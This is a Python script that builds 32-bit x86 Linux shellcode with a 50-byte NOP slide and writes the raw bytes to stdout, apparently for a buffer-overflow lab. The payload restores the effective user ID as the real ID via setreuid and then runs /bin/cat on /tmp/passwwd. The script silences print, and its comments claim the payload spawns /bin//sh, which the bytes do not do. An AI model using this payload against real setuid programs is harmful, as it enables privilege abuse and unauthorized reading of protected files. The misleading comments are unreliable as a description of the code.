import sys

NOP_SLIDE = 50

print = lambda *args, **kwargs: None # override print function


# setreuid(geteuid(), geteuid())
# execv("/bin//sh", argv)

# Shellcode in Python
shellcode = (
    b"\x6a\x31"  # push 0x31 (49)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (70)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80, setreuid(geteuid(), geteuid())

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x63\x61\x74"  # push "/cat"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin/cat",\x00)

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x73\x77\x77\x64"  # push "swwd"
    b"\x68\x2f\x70\x61\x73"  # push "/pas"
    b"\x68\x2f\x74\x6d\x70"  # push "/tmp"
    b"\x89\xe1"  # mov ecx, esp (now ecx contains: "/tmp/passwwd",\x00)
    

    b"\x52"      # push edx (push NULL into stack)
    b"\x51"      # push ecx (push arg1)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)
    # argv = ['$pathname', '/tmp/passwwd', NULL]

    b"\xb0\x0b"  # mov al, 0x0b (11)
    b"\xcd\x80"  # int 0x80 (execv("/bin/cat", argv))

        # mv eax, 1         ; system call number (sys_exit)
    b"\x6a\x01"  # push 1
    b"\x58"      # pop eax (sys_exit)
    # int 0x80
    b"\xcd\x80"  # int 0x80 (exit())
)

# Print shellcode details
print("Shellcode code is:")
print("setreuid(geteuid(), geteuid())")
print("execv(\"/bin//sh\", argv)")

# Print shellcode with NOP slide
print("\nShellcode as formatted string:")

# Add NOP slide (\x90) before shellcode
nop_slide = b"\x90" * NOP_SLIDE
formatted_shellcode = nop_slide + shellcode

# Convert to formatted string
formatted_string = "".join(f"\\x{byte:02x}" for byte in formatted_shellcode)
print(formatted_string)

# Print shellcode in hex format
print("\nShellcode in hex format:")
print("".join(f"{byte:02x}" for byte in formatted_shellcode))

# Calculate shellcode length
print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")

sys.stdout.buffer.write(formatted_shellcode)
